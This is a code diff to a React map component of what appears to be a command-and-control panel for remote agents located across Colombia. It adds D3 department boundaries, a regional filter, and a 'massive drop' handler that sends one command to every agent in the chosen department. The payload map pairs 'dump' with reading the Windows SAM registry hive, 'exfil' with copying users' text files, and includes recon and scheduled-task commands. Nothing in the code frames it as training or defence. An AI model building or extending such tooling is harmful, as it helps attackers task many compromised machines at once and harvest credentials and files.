@@ -14,42 +14,9 @@ import {
   WifiOff
 } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
+import { geoMercator, geoPath, geoContains } from 'd3-geo';
 
-// Boundaries for Colombia map coordinate projection
-const MAP_BOUNDS = {
-  minLng: -79.5,
-  maxLng: -66.5,
-  minLat: -4.5,
-  maxLat: 13.0
-};
-
-// Colombian border coordinates to draw a vector silhouette path
-const COLOMBIA_BORDER_COORDS = [
-  { lat: 12.4, lng: -71.7 }, // Punta Gallinas (Guajira)
-  { lat: 11.8, lng: -72.3 }, // Golfo de Venezuela border
-  { lat: 9.0, lng: -72.9 },  // Catatumbo border
-  { lat: 7.9, lng: -72.5 },  // Cucuta
-  { lat: 7.1, lng: -70.7 },  // Arauca river
-  { lat: 6.2, lng: -67.5 },  // Puerto Carreno (Orinoco junction)
-  { lat: 3.8, lng: -67.9 },  // Inirida border
-  { lat: 1.2, lng: -66.9 },  // Guainia southernmost border
-  { lat: -1.2, lng: -69.6 }, // Putumayo junction
-  { lat: -4.2, lng: -69.9 }, // Leticia (Amazon river)
-  { lat: -2.0, lng: -74.0 }, // Caqueta river border
-  { lat: -0.1, lng: -75.2 }, // Gueppi (Ecuador border)
-  { lat: 0.8, lng: -77.5 },  // Ipiales (Andean border)
-  { lat: 1.8, lng: -78.8 },  // Tumaco (Pacific southernmost coast)
-  { lat: 4.9, lng: -77.4 },  // Choco Pacific coast
-  { lat: 7.1, lng: -77.8 },  // Panama border (Jurado)
-  { lat: 8.1, lng: -76.9 },  // Golfo de Uraba
-  { lat: 8.8, lng: -76.4 },  // Cordoba coast
-  { lat: 9.8, lng: -75.7 },  // Sucre coast
-  { lat: 10.4, lng: -75.5 }, // Cartagena
-  { lat: 11.0, lng: -74.8 }, // Barranquilla
-  { lat: 11.2, lng: -74.2 }, // Santa Marta
-  { lat: 12.2, lng: -72.1 }, // Manaure / Cabo de la Vela
-  { lat: 12.4, lng: -71.7 }  // Close path
-];
+// El mapa ahora utiliza D3 GeoJSON cargado dinámicamente
 
 const commandLibrary = [
   { id: 'recon', label: 'Recon', description: 'Enumerar procesos y servicios' },
@@ -67,9 +34,20 @@ export default function Map() {
   const [executions, setExecutions] = useState<Array<{ id: number; agentId: string; command: string; timestamp: string; status: string }>>([]);
   const navigate = useNavigate();
 
+  const [geoData, setGeoData] = useState<any>(null);
+  const [selectedDepartment, setSelectedDepartment] = useState<string>('TODOS');
+
   // Width and height of the SVG map container
   const mapWidth = 600;
   const mapHeight = 700;
+
+  useEffect(() => {
+    // Cargar GeoJSON de Colombia
+    fetch('/assets/colombia.geo.json')
+      .then(res => res.json())
+      .then(data => setGeoData(data))
+      .catch(err => console.error('Error loading geojson:', err));
+  }, []);
 
   useEffect(() => {
     fetchLocations();
@@ -80,27 +58,33 @@ export default function Map() {
     return () => clearInterval(interval);
   }, [fetchLocations]);
 
+  // Proyección D3
+  const projection = geoData ? geoMercator().fitSize([mapWidth, mapHeight], geoData) : null;
+  const pathGenerator = projection ? geoPath().projection(projection) : null;
+
   // Project Lat/Lng coordinates into SVG (x, y) pixels
   const projectCoords = (lat: number, lng: number) => {
-    const x = ((lng - MAP_BOUNDS.minLng) / (MAP_BOUNDS.maxLng - MAP_BOUNDS.minLng)) * mapWidth;
-    // Y-axis is inverted in SVG, so top is maxLat
-    const y = ((MAP_BOUNDS.maxLat - lat) / (MAP_BOUNDS.maxLat - MAP_BOUNDS.minLat)) * mapHeight;
-    return { x, y };
+    if (!projection) return { x: 0, y: 0 };
+    const coords = projection([lng, lat]);
+    if (!coords) return { x: 0, y: 0 };
+    return { x: coords[0], y: coords[1] };
   };
 
-  // Build the SVG path string for Colombia border
-  const borderPoints = COLOMBIA_BORDER_COORDS.map(coord => {
-    const { x, y } = projectCoords(coord.lat, coord.lng);
-    return `${x.toFixed(1)},${y.toFixed(1)}`;
-  });
-  const borderPathD = `M ${borderPoints.join(' L ')} Z`;
+  // Filtered locations based on search query and department filter
+  const filteredLocations = locations.filter(loc => {
+    const textMatch = loc.agentId.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                      loc.city.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                      loc.ip.includes(searchQuery);
 
-  // Filtered locations based on search query
-  const filteredLocations = locations.filter(loc => 
-    loc.agentId.toLowerCase().includes(searchQuery.toLowerCase()) ||
-    loc.city.toLowerCase().includes(searchQuery.toLowerCase()) ||
-    loc.ip.includes(searchQuery)
-  );
+    let deptMatch = true;
+    if (selectedDepartment !== 'TODOS' && geoData) {
+      const deptFeature = geoData.features.find((f: any) => f.properties.NOMBRE_DPT === selectedDepartment);
+      if (deptFeature) {
+        deptMatch = geoContains(deptFeature, [loc.lng, loc.lat]);
+      }
+    }
+    return textMatch && deptMatch;
+  });
 
   const handleDragStart = (event: DragEvent<HTMLDivElement>, commandId: string) => {
     event.dataTransfer.setData('text/plain', commandId);
@@ -156,6 +140,51 @@ export default function Map() {
       setDraggedCommand(null);
     }
   };
+  const handleMassiveDrop = async (event: DragEvent<HTMLDivElement>) => {
+    event.preventDefault();
+    if (selectedDepartment === 'TODOS' || filteredLocations.length === 0) return;
+    
+    const commandId = event.dataTransfer.getData('text/plain');
+    const selectedCommand = commandLibrary.find((cmd) => cmd.id === commandId);
+    if (!selectedCommand) return;
+
+    const commandPayloads: Record<string, string> = {
+      recon: 'whoami',
+      dump: 'reg query HKLM\\SAM',
+      beacon: 'schtasks /query',
+      exfil: 'copy /b C:\\Users\\Public\\*.txt',
+    };
+
+    try {
+      const promises = filteredLocations.map(loc => 
+        sendAgentCommand({
+          agentId: loc.agentId,
+          command: commandPayloads[commandId] || selectedCommand.label,
+        }).then(result => ({ loc, result })).catch(error => ({ loc, error }))
+      );
+      
+      const results = await Promise.all(promises);
+      
+      const newExecutions = results.map((res, idx) => ({
+        id: Date.now() + idx,
+        agentId: res.loc.agentId,
+        command: selectedCommand.label,
+        timestamp: new Date().toLocaleTimeString(),
+        status: 'result' in res && res.result ? (res.result.status === 'sent' ? 'Enviado' : res.result.status) : 'Error',
+      }));
+
+      setExecutions((prev) => [...newExecutions, ...prev].slice(0, 15));
+    } finally {
+      setDraggedCommand(null);
+    }
+  };
+
+  const calculateRegionalHealth = () => {
+    if (selectedDepartment === 'TODOS' || filteredLocations.length === 0) return 'normal';
+    const offlineCount = filteredLocations.filter(loc => loc.status === 'offline').length;
+    return (offlineCount / filteredLocations.length) >= 0.5 ? 'critical' : 'normal';
+  };
+  const regionalHealth = calculateRegionalHealth();
 
   return (
     <div className="space-y-6 text-slate-100 pb-12">
@@ -187,17 +216,41 @@ export default function Map() {
         </div>
       )}
 
-      <div className="flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-4">
-        <div>
-          <h2 className="text-sm font-semibold text-white">Modo de visualización</h2>
-          <p className="text-xs text-slate-400 mt-1">
-            Cambia entre la vista de drones y el mapa tradicional.
-          </p>
+      <div className="flex flex-col md:flex-row gap-4 bg-slate-900/40 border border-slate-800 rounded-2xl p-4">
+        {/* Controles del Filtro Táctico Global */}
+        <div className="flex-1 flex flex-col sm:flex-row gap-4 items-center">
+          <div className="flex items-center gap-2 min-w-max text-slate-300 font-semibold text-sm">
+            <Globe className="w-4 h-4 text-blue-400" /> Filtro Global:
+          </div>
+          <select
+            value={selectedDepartment}
+            onChange={(e) => setSelectedDepartment(e.target.value)}
+            className="w-full sm:w-64 bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-slate-200 cursor-pointer"
+          >
+            <option value="TODOS">Todos los Departamentos</option>
+            {geoData?.features.map((f: any) => (
+              <option key={f.properties.DPTO || f.properties.NOMBRE_DPT} value={f.properties.NOMBRE_DPT}>
+                {f.properties.NOMBRE_DPT}
+              </option>
+            ))}
+          </select>
+          <div className="relative w-full sm:w-64">
+            <Search className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
+            <input
+              type="text"
+              placeholder="Buscar por ID, IP..."
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              className="w-full bg-slate-950 border border-slate-800 rounded-lg pl-9 pr-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-slate-200"
+            />
+          </div>
         </div>
-        <div className="inline-flex rounded-full border border-slate-800 bg-slate-950 p-1">
+
+        {/* Botones de Modo */}
+        <div className="inline-flex rounded-full border border-slate-800 bg-slate-950 p-1 shrink-0">
           <button
             onClick={() => setDroneMode(true)}
-            className={`rounded-full px-3 py-2 text-sm font-semibold transition ${
+            className={`rounded-full px-4 py-2 text-xs font-semibold transition ${
               droneMode ? 'bg-emerald-600 text-white' : 'bg-transparent text-slate-300 hover:text-white'
             }`}
           >
@@ -205,7 +258,7 @@ export default function Map() {
           </button>
           <button
             onClick={() => setDroneMode(false)}
-            className={`rounded-full px-3 py-2 text-sm font-semibold transition ${
+            className={`rounded-full px-4 py-2 text-xs font-semibold transition ${
               !droneMode ? 'bg-slate-700 text-white' : 'bg-transparent text-slate-300 hover:text-white'
             }`}
           >
@@ -248,10 +301,18 @@ export default function Map() {
               </span>
             </div>
 
-            <div className="grid h-[360px] grid-cols-2 gap-6 overflow-hidden rounded-xl border border-slate-800 bg-[radial-gradient(circle_at_center,_rgba(59,130,246,0.12),_transparent_62%)] p-4 sm:grid-cols-3 xl:grid-cols-4">
+            <div 
+              onDragOver={handleDragOver}
+              onDrop={handleMassiveDrop}
+              className={`grid h-[360px] grid-cols-2 gap-6 overflow-hidden rounded-xl border p-4 sm:grid-cols-3 xl:grid-cols-4 transition-colors duration-500 ${
+                regionalHealth === 'critical' 
+                  ? 'border-red-500/50 bg-[radial-gradient(circle_at_center,_rgba(239,68,68,0.15),_transparent_62%)]' 
+                  : 'border-slate-800 bg-[radial-gradient(circle_at_center,_rgba(59,130,246,0.12),_transparent_62%)]'
+              }`}
+            >
               {filteredLocations.length === 0 ? (
                 <div className="col-span-full flex h-full items-center justify-center text-center text-sm text-slate-500">
-                  No hay agentes disponibles para el modo dron.
+                  No hay agentes disponibles en esta región.
                 </div>
               ) : (
                 filteredLocations.map((loc) => {
@@ -261,14 +322,21 @@ export default function Map() {
                     <div
                       key={loc.agentId}
                       onDragOver={handleDragOver}
-                      onDrop={(event) => handleDrop(event, loc.agentId)}
-                      className="flex flex-col items-center"
+                      onDrop={(event) => {
+                        event.stopPropagation(); // Evitar disparo masivo
+                        handleDrop(event, loc.agentId);
+                      }}
+                      className="flex flex-col items-center group cursor-crosshair"
                     >
-                      <div className={`flex h-14 w-14 items-center justify-center rounded-full border-2 ${isOnline ? 'border-emerald-400 bg-emerald-500/20 shadow-[0_0_24px_rgba(16,185,129,0.25)]' : 'border-slate-500 bg-slate-700/30'}`}>
+                      <div className={`flex h-14 w-14 items-center justify-center rounded-full border-2 transition-transform group-hover:scale-110 ${isOnline ? 'border-emerald-400 bg-emerald-500/20 shadow-[0_0_24px_rgba(16,185,129,0.25)]' : 'border-slate-500 bg-slate-700/30'}`}>
                         <span className={`h-4 w-4 rounded-full ${isOnline ? 'bg-emerald-400' : 'bg-slate-400'}`} />
                       </div>
-                      <span className="mt-2 max-w-[90px] truncate text-center text-[11px] font-semibold text-slate-300">
+                      <span className="mt-2 max-w-[100px] truncate text-center text-[11px] font-semibold text-slate-200">
                         {loc.agentId}
+                      </span>
+                      <span className="max-w-[100px] truncate text-center text-[9px] font-mono text-slate-400 leading-tight mt-0.5">
+                        {loc.ip}<br/>
+                        <span className="text-slate-500 uppercase tracking-wider">{loc.city}</span>
                       </span>
                     </div>
                   );
@@ -306,23 +374,6 @@ export default function Map() {
           
           {/* Left Panel: Search & Agent List (1 col) */}
         <div className="lg:col-span-1 space-y-4 flex flex-col max-h-[700px]">
-          <div className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 space-y-3">
-            <h2 className="text-sm font-semibold text-slate-300 flex items-center gap-2">
-              <Globe className="w-4 h-4 text-blue-400" />
-              Buscador de Agentes
-            </h2>
-            <div className="relative">
-              <Search className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
-              <input
-                type="text"
-                placeholder="ID, Ciudad, Dirección IP..."
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className="w-full bg-slate-950 border border-slate-800 rounded-lg pl-9 pr-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-slate-200"
-              />
-            </div>
-          </div>
-
           {/* List Box */}
           <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-3 flex-1 overflow-y-auto space-y-2">
             <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-semibold px-2">
@@ -401,26 +452,28 @@ export default function Map() {
             <line x1="0" y1={mapHeight/2} x2={mapWidth} y2={mapHeight/2} stroke="#334155" strokeWidth="0.5" strokeDasharray="5,5" />
             <line x1={mapWidth/2} y1="0" x2={mapWidth/2} y2={mapHeight} stroke="#334155" strokeWidth="0.5" strokeDasharray="5,5" />
             
-            {/* Colombia vector shape path */}
-            <path
-              d={borderPathD}
-              fill="#1e293b"
-              fillOpacity="0.4"
-              stroke="#3b82f6"
-              strokeWidth="1.5"
-              strokeOpacity="0.7"
-              strokeDasharray="1000"
-              className="transition-all duration-700"
-            />
-            
-            {/* Colombia inner structural decoration lines */}
-            <path
-              d={borderPathD}
-              fill="none"
-              stroke="#2563eb"
-              strokeWidth="0.5"
-              strokeOpacity="0.3"
-            />
+            {/* GeoJSON Departments rendering with D3 */}
+            {geoData && pathGenerator && geoData.features.map((feature: any, i: number) => {
+              const isSelected = selectedDepartment === feature.properties.NOMBRE_DPT;
+              const isFaded = selectedDepartment !== 'TODOS' && !isSelected;
+              
+              return (
+                <path
+                  key={feature.properties.DPTO || i}
+                  d={pathGenerator(feature) || ''}
+                  fill={isSelected ? 'rgba(59, 130, 246, 0.25)' : '#1e293b'}
+                  fillOpacity={isFaded ? 0.1 : (isSelected ? 0.3 : 0.4)}
+                  stroke={isSelected ? '#60a5fa' : '#3b82f6'}
+                  strokeWidth={isSelected ? 1.5 : 0.5}
+                  strokeOpacity={isFaded ? 0.2 : (isSelected ? 1 : 0.4)}
+                  className={`transition-all duration-700 hover:fill-blue-900/40 hover:stroke-blue-400 ${isSelected ? 'drop-shadow-[0_0_8px_rgba(59,130,246,0.6)]' : ''}`}
+                  onClick={() => setSelectedDepartment(isSelected ? 'TODOS' : feature.properties.NOMBRE_DPT)}
+                  style={{ cursor: 'pointer' }}
+                >
+                  <title>{feature.properties.NOMBRE_DPT}</title>
+                </path>
+              );
+            })}
 
             {/* Render Agent radar nodes */}
             {filteredLocations.map((loc) => {
@@ -560,9 +613,9 @@ export default function Map() {
               </button>
             )}
           </div>
+          </div>
         </div>
       )}
     </div>
-  </div>
   );
 }
